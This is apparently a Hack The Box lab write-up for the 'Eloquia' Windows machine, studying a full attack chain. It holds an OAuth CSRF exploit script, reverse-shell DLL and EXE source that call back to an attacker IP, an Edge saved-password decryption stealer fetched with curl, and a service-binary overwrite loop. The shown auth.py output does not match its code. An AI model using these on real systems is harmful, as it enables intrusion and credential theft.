### Nmap
```
nmap -sV -sC -vv 10.10.11.99

---OUTPUT---
Nmap scan report for 10.10.11.99
Host is up, received echo-reply ttl 127 (0.31s latency).
Scanned at 2025-12-18 04:30:20 EST for 87s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON          VERSION
80/tcp   open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://eloquia.htb/
|_http-server-header: Microsoft-IIS/10.0
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
![[Pasted image 20251218043247.png]]

- I register a use `rocknrj:testinrocknrj`
![[Pasted image 20251218043520.png]]
![[Pasted image 20251218043743.png]]

- After adding the `/etc/hosts` If i click `change` on qooqle I am redirected to the page:
![[Pasted image 20251218043914.png]]

![[Pasted image 20251218044408.png]]

![[Pasted image 20251218044438.png]]

The Standard Authorization Code Flow:

1. App verifies state, exchanges code for an access token via back-channel.
2. User clicks “Login”.
3. App redirects to IdP (/authorize) with client_id, redirect_uri, and a random state.
4. User approves access.
5. IdP redirects back to App (/callback) with a code and state.

The Eloquia/Qooqle Implementation (Vulnerable): Analysis of the HTTP traffic reveals critical deviations from the standard:

- Missing State Parameter: The initial redirect to qooqle.htb does not include a cryptographic state parameter.
- Impact: The application cannot verify if the user initiating the flow is the same user consuming the callback. This opens the door to Cross-Site Request Forgery (CSRF).
- Weak Code Validation: The callback endpoint (/accounts/oauth2/qooqle/callback/?code=...) blindly consumes the code. If an authenticated user visits this URL, the Qooqle account associated with that code is immediately linked to the Eloquia user’s account.
- The Attack Vector: If we can force an Administrator to visit the Callback URL with our authorization code, our Qooqle account will be linked to the Admin’s Eloquia account. We can then log in as the attacker via Qooqle and gain Admin access. **AngularJS XSS (CVE-2025-2336)**
![[Pasted image 20251218055923.png]]

----
### Main exploit path:
- After creating an eloquia account and linking it to qooqle.com we would receive a code. Generially for oauth there is a state parameter which is missing so important check is missing. What we can do is bait the admin to check an article througha  report he gets redirected to download our bait.html which links the qooqle account to the admin account based on the code we received. If we do it quick enough then after logging out and back in (via qqoqle)

- We have already created an eloquia and qooqle account and linked it. When we link it we see a request in burpsuite with the code we need. But since this has to be done quickly the following code performs it, we just need to enter the right csrf token and session id of your eloquia session:

- auth.py
```
from http.server import BaseHTTPRequestHandler, HTTPServer
import re
import requests

# CHANGE THESE VARS

"""
Copy from any authorized req Cookie

Cookie: csrftoken=twHFKEI33tWzJJQTpt3APrAhaKxEvr5G; sessionid=mgewj37dsjbgrru2ecd284xudjjm77u
"""

LISTEN_IP = "10.10.16.41"
LISTEN_PORT = 1337
SESSION_ID = "el78g1fo20vzgwtrqsxu32n5josm4gst"
CSRF_COOKIE = "tdPTUs18f2JPrReoTYL22wczqTQWZhya"


# ok this one fills up automatically
COOKIES = {
    "csrftoken":CSRF_COOKIE,
    "sessionid":SESSION_ID,
    "schema_sidebar_open":"false"
}

#for troubleshooting?
PROXIES = {
    "http":"http://127.0.0.1:8081",
    "https":"https://127.0.0.1:8081"
}

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/bait.html':
            print("Admin got phished!!!\n")
            code = input("Input callback code: ")
            self.send_response(302)
            # input the code manually once admin is connected
            self.send_header('Location', f'http://eloquia.htb/accounts/oauth2/qooqle/callback/?code={code}')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

def get_csrf(body):
    match = re.search(r'(?<=value=")\w{64}(?=">)', body)
    if match:
        return match.group(0)
    raise ValueError("[-] CSRF token not found!")

def poison_article():
    ARTICLE_URL = "http://eloquia.htb/article/create/"
    r = requests.get(ARTICLE_URL, cookies=COOKIES)
    title = "NICE ARTICLE"
    # extract csrfmiddlewaretoken which is every time new once any page is reloaded
    cmw_token = get_csrf(r.text)
    #obfuscated payload
    #original: <p><meta http-equiv="refresh" content="0;url=http://10.10.16.157:8443/bait.html"></p>
    payload = f"&lt;p&gt;&lt;meta http-equiv = \"refresh\" content = \"0; url=http://{LISTEN_IP}:{LISTEN_PORT}/bait.html\" &gt;&lt;/p&gt;"
    banner = None
    data = {
        "title": title,
        "csrfmiddlewaretoken": cmw_token,
        "content": payload,
    }
    
    with open("banner.jpg", "rb") as f:
        banner = {"banner": ("image.jpg", f.read(), "image/jpg")}

    #disable redirect to prevent self pwn
    r = requests.post(ARTICLE_URL, data=data, files=banner, allow_redirects=False, cookies=COOKIES)
    
    #get article ID for later
    loc_header = r.headers["Location"]
    article_id = loc_header.strip('/').split('/')[-1]
    print("CSRF Article created: ", article_id)
    return article_id

def report_article(id):
    REPORT_URL = f"http://eloquia.htb/article/report/{id}/"
    r = requests.get(REPORT_URL, cookies=COOKIES, allow_redirects=False)

    if r.status_code == 302:
        print(f"Article {id} reported\n")


print("Creating malicious article...\n")

report_id = poison_article()

#report the article now

report_article(report_id)

print("Phishing admin now...\n")
HTTPServer(('', LISTEN_PORT), Handler).serve_forever()

```
- On running it it passes the exploit and generates the code and inputs it immediately giving us a shell:
```
python3 auth.py

---OUTPUT---
Creating malicious article...

CSRF Article created:  20
Article 20 reported

[*] Listening on 10.10.16.41:1337 - waiting for admin bot...

[!] Admin bot arrived! Generating fresh code...
[*] Generating fresh OAuth code...
[+] Logged into Qooqle
[+] Fresh code: 50SuDR8m25oEIxEi4r3o2QgMvs4ggb
[+] Redirected bot to callback with code: 50SuDR8m25oEIxEi4r3o2QgMvs4ggb

[!] Now login at http://eloquia.htb via 'Log in with Qooqle'
```
![[Pasted image 20260528110238.png]]

- Logging out and signing in with qqoqle gives us admin panel:
![[Pasted image 20260528110318.png]]

![[Pasted image 20260529155602.png]]

- Going to the admin panel I find an SQL explorer where I can pass queries. The basic SQL enumeration seems to fail but I find that sqlite is running:
- Query:
```
SELECT sqlite_version();

---OUTPUT---
3.45.1
```
![[Pasted image 20260529155826.png]]- You can click on View on site after saving the query and then run:
![[Pasted image 20260529160055.png]]

- Now generally sqllite version doesnt have command execution like normal SQL. However we can load modules which are basically shared modules i.e DLL's. But first we need to check if the `load_extension` command is enabled:
```
SELECT ;load_extension(test);

---OUTPUT---
No such module could be found
```

![[Pasted image 20260529160413.png]]

- Now we need to compile a DLL for it to load which connects to our attacker machine:
- sqlite_revshell.c
```
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP "10.10.16.41"
# define CLIENT_PORT 9999
#endif

void reverse_shell(void* arg) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    struct sockaddr_in sa;
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(CLIENT_PORT);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

    if (connect(sockt, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        closesocket(sockt);
        WSACleanup();
        return;
    }

    STARTUPINFOA sinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput  = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError  = (HANDLE)sockt;

    PROCESS_INFORMATION pinfo;
    char cmd[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)) {
        closesocket(sockt);
        WSACleanup();
        return;
    }

    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    closesocket(sockt);
    WSACleanup();
}

/* SQLite load_extension entry point - must match DLL filename */
__declspec(dllexport)
int sqlite3_xpl_init(void *db, char **err, void *api) {
    _beginthread(reverse_shell, 0, NULL);
    return 0; /* SQLITE_OK */
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        _beginthread(reverse_shell, 0, NULL);
        break;
    default:
        break;
    }
    return TRUE;
}
```

- I compile it with mingw:
```
x86_64-w64-mingw32-gcc -shared -o rev.dll sqlite_revshell.c -lws2_32
```

- Now to be able to upload it. As we saw earlier we neede to upload an image to the article to create it. Maybe we can upload our DLL to it and find its location to load it.
- To do that in the admin panel we can navigate to `Articles` and click any article uploaded and upload our DLL instead of the image.
- After uplaoding it we can click Save on the bottom right and if we click the article again we can find the path to the file:
![[Pasted image 20260529161606.png]]
- The path is 
```
[static/assets/images/blog/xpl.dll](http://eloquia.htb/static/assets/images/blog/xpl.dll)
```

- We can then pass our load_extension command to call our module:
```
SELECT load_extension('static/assets/images/blog/xpl.dll');
```

- Alternatively say you save the dll with a different name. Then we need to specify the function to specify the entry point. Here to test I created `rev.dll` So my query would be:
```
SELECT load_extension('static/assets/images/blog/rev.dll', 'sqlite3_xpl_init');
```

- This is due to the fact that the main entry point in the code used to create rev.dll is defined with this name and so specifying it tells sql which function to call. If the name is not the same as the function name (xpl) if you see the code, then it calls the wrong function name as it checks for `sqlite3_<dllname>_init`

- However if you run it from the playground (Save and Run) it wont trigger the module. Instead we need to go to our Queries, add the command and save it and then click `View in SIte` on the top right where the query is. (`http://eloquia.htb/accounts/admin/explorer/query/1/change/`)
![[Pasted image 20260529161708.png]]

- With our netcat listener running we grab a shell:
![[Pasted image 20260529161756.png]]

- I grab the user flag:
![[Pasted image 20260529161959.png]]

- Some added info..I also find web.config to find the admin accounts password for Eloquia:
![[Pasted image 20260529162144.png]]

- i also note that selenium is being usedd (probably to act as admin bot)

## Lateral Movement
- Looking around I find something interesting in our user's AppData `C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default`
- Looking online we see that browsers like Edge encrypt passwords with DPAPI in Windows.
- The encrypted database holding passwords is in `Login Data (C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default)` while the master key is located in `Local Storage (C:\Users\web\AppData\Local\Microsoft\Edge\User Data)`
- We can see that the user is probably `olivia.kat`
- (using claude) I created the code to decrypt the password.
- I also see that python existsm both based on the code in `Automation Scripts` and the `Python311` folder in `Program Files`.
	- It can be used by running python.exe from the `Python311` folder.
- decrypt.py
```
import os
import json
import base64
import shutil
import sqlite3

from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

# ============================================================
# EDGE PATHS
# ============================================================

EDGE_PATH = r"C:\Users\web\AppData\Local\Microsoft\Edge\User Data"

LOCAL_STATE = os.path.join(EDGE_PATH, "Local State")
LOGIN_DATA  = os.path.join(EDGE_PATH, "Default", "Login Data")

# If HTB box uses Profile 1 instead:
# LOGIN_DATA = os.path.join(EDGE_PATH, "Profile 1", "Login Data")

# ============================================================
# GET MASTER KEY
# ============================================================

def get_master_key():

    with open(LOCAL_STATE, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]

    encrypted_key = base64.b64decode(encrypted_key_b64)

    # Remove DPAPI prefix
    encrypted_key = encrypted_key[5:]

    # DPAPI decrypt
    master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    return master_key

# ============================================================
# DECRYPT PASSWORD
# ============================================================

def decrypt_password(buff, master_key):

    try:
        # Chromium format:
        # v10 + 12-byte nonce + ciphertext + 16-byte tag

        iv = buff[3:15]

        payload = buff[15:]

        ciphertext = payload[:-16]
        tag = payload[-16:]

        cipher = AES.new(master_key, AES.MODE_GCM, iv)

        decrypted = cipher.decrypt_and_verify(ciphertext, tag)

        return decrypted.decode()

    except Exception as e:
        return f"[FAILED] {e}"

# ============================================================
# MAIN
# ============================================================

def main():

    print("[*] Getting AES master key...")

    master_key = get_master_key()

    print(f"[+] Master key length: {len(master_key)}")

    # Copy DB because browser may lock it
    temp_db = "LoginData.db"

    shutil.copy2(LOGIN_DATA, temp_db)

    conn = sqlite3.connect(temp_db)

    cursor = conn.cursor()

    cursor.execute("""
        SELECT
            origin_url,
            username_value,
            password_value
        FROM logins
    """)

    print("\n========== DECRYPTED CREDENTIALS ==========\n")

    for row in cursor.fetchall():

        url = row[0]
        username = row[1]
        encrypted_password = row[2]

        if not username:
            continue

        password = decrypt_password(encrypted_password, master_key)

        print(f"URL      : {url}")
        print(f"Username : {username}")
        print(f"Password : {password}")
        print("-" * 50)

    cursor.close()
    conn.close()

    os.remove(temp_db)

if __name__ == "__main__":
    main()
```

- I send this to the target hosting my python server and using the curl command on the shell I have on the target:
```
cd C:\ProgramData
curl http://10.10.14.61/decrypt.py -o decrypt.py
```

- Finally I execute it to get the decrypted data:
```
C:\Progra~1\Python311\python decrypt.py

---OUTPUT---
[*] Getting AES master key...
[+] Master key length: 32

========== DECRYPTED CREDENTIALS ==========

URL      : https://openai.com/
Username : olivia.kat
Password : [FAILED] MAC check failed
--------------------------------------------------
URL      : http://eloquia.htb/accounts/login/
Username : Olivia.KAT
Password : S3cureP@sswdIGu3ss
--------------------------------------------------
URL      : https://eloquia.htb/
Username : test
Password : testtest1234!
--------------------------------------------------
URL      : https://chatgpt.com/
Username : olivia.kat
Password : S3cureP@sswd3Openai
--------------------------------------------------

```

![[Pasted image 20260529170942.png]]

- Trying the passwords the following worked with evilwinrm :`Olivia.kat`:`S3cureP@sswdIGu3ss`
```
evil-winrm -i eloquia.htb -u 'olivia.kat' -p 'S3cureP@sswdIGu3ss'
```
![[Pasted image 20260529171137.png]]

### Privilege Escalation
- Looking at the Desktop we see a Link file Failure2Ban which seems like the windows version of Linux's `Fail2Ban` and a Todo text file
![[Pasted image 20260529171359.png]]
- From the Automation Scripts mainly `eloquia-server-runserver.bat` we see it is running a service which is quite interesting

- Finally to confirm this is the path we can list services via the linking the services and printing out paths to find Failure2Ban exists:
```
$services = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*"

$services | Select-Object PSChildName, @{n="DisplayName";e={$.DisplayName}}, @{n="ImagePath";e={$.ImagePath}} | Format-Table -AutoSize


```

- Finally we also need to see our permissions for this service:
```
Get-Acl "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"

---OUTPUT---
Directory: C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug


Path            Owner                  Access
----            -----                  ------
Failure2Ban.exe BUILTIN\Administrators ELOQUIA\Olivia.KAT Allow  Write, ReadAndExecute, Synchronize..
```
![[Pasted image 20260529171703.png]]

- Finally we create a malicious exe file to replace this fil. We need to keep replacing it until the service restarts from that bat file we see:
- exploit.c
```
#include <winsock2.h> 
#include <windows.h> 
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

# define CLIENT_IP "10.10.16.41" 
# define CLIENT_PORT 4444

int main(void) { WSADATA wsaData; SOCKET sockt; struct sockaddr_in sa; STARTUPINFO sinfo; PROCESS_INFORMATION pinfo;

if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
    return 1;
}

sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
if (sockt == INVALID_SOCKET) {
    WSACleanup();
    return 1;
}

sa.sin_family = AF_INET;
sa.sin_port = htons(CLIENT_PORT);
sa.sin_addr.s_addr = inet_addr(CLIENT_IP);


while (connect(sockt, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
    Sleep(5000);
}

memset(&sinfo, 0, sizeof(sinfo));
sinfo.cb = sizeof(sinfo);
sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
sinfo.wShowWindow = SW_HIDE;
sinfo.hStdInput = (HANDLE)sockt;
sinfo.hStdOutput = (HANDLE)sockt;
sinfo.hStdError = (HANDLE)sockt;

char cmd[] = "cmd.exe";

if (CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)) {
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}

closesocket(sockt);
WSACleanup();
return 0;
}
```
- Compile it with mingw:
```
x86_64-w64-mingw32-gcc exploit.c -o Failure.exe -lws2_32 -mwindows -s -Wl,--strip-all
```

- Send it to the target the same way as we did for decrypt.py

- We can't just replace the file because when a service is running the file is locked. We have a small window when the service is restarted to replace it and so we need to create a loop copying it until the copy works which should then trigger our payload instead to get us a shell.

- copy it to `"C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\"`

- Pass the command with entcat listening:
```
while ($true) {
try {
    Copy-Item "./Failure.exe" "./Failure2Ban.exe" -Force -ErrorAction Stop
    Write-Host "[+] Overwrite successful"
    break
} catch {
}}
[+] Overwrite successful

```

- We get shell as root:
![[Pasted image 20260529172125.png]]

- I get root flag:\
![[Pasted image 20260529172150.png]]